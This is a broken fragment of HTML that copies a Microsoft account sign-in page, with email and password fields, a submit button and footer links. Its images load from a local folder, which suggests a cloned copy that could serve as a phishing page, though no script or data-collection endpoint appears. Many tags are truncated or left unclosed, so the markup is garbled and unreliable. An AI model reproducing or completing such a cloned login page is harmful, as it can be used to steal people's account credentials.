<!DOCTYPE html>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">

                                    <img class="logo" role="img"

                                                      <div role="heading" aria-level="1">Sign in</div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="row">

                                                   </div>

                                                         data-report-value="Email_Phone_Skype_Entry"

                                                         placeholder="Email, phone, or Skype" data-report-attached="1"

                                                   <div role="alert" aria-live="assertive">
                                                      <div id="passwordError" class="error ext-error hidden">
                                                         Please enter the password for your Microsoft account.</div>
                                                   </div>

                                                      <input name="passwd" type="password" id="i0118" autocomplete="off"
                                                         class="form-control input ext-input text-box ext-text-box"
                                                         aria-required="true"
                                                         aria-describedby="loginHeader passwordError  "
                                                         placeholder="Password" aria-label="Enter the password"
                                                         tabindex="0">
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="position-buttons">
                                                <div class="row">
                                                   <div class="col-md-24">
                                                      <div class="text-13">

                                                               href="#"
                                                               id="signup"
                                                               aria-label="Create a Microsoft account">Create
                                                               one!</a>
                                                         </div>

                                                            <a id="idA_PWD_SwitchToFido" name="switchToFido"

                                                            <span class="help-button" role="button" tabindex="0"
                                                               aria-label="Learn more about signing in with a security key">
                                                               <img role="presentation"
                                                                  pngsrc="images/documentation_9628e22a6bfb1edc59e81064a666b614.png"
                                                                  svgsrc="images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"
                                                                  src="images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg">
                                                            </span>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="win-button-pin-bottom">

                                                   <div>
                                                      <div class="col-xs-24 no-padding-left-right button-container">
                                                         <div class="inline-block">
                                                            <input type="submit" id="idSIButton9"
                                                               class="win-button button_primary button ext-button primary ext-primary"
                                                               data-report-event="Signin_Submit"
                                                               data-report-trigger="click" data-report-value="Submit">
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>

                                             </div>
                                             <div class="table-cell text-left content">
                                                <div data-test-id="signinOptions">Sign-in
                                                   options
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div id="footer" role="contentinfo" class="footer ext-footer">
                  <div>
                     <div id="footerLinks" class="footerNode text-secondary">
                        <a id="ftrTerms" </a>
                           <a id="ftrPrivacy" </a>
                              <a id="moreOptions" href="#" role="button"

                                 class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
